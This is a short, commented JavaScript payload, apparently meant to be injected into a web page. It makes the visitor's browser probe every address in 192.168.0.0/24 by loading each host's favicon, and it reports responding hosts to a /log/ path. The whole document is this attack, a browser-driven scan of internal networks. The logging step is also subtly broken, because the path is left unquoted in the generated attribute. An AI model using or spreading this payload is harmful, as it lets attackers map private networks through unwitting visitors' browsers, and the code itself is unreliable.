<script>
  for (let i = 0; i < 256; i++) 
  { 
    // This is looping from 0 to 255
    let ip = '192.168.0.' + i         // Creates variable for forming IP
    
    // Creating an image element, if the resource can load, it logs to the /logs page.
    let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
    
    document.body.innerHTML += code   // This is adding the image element to the webpage
  }
</script> 
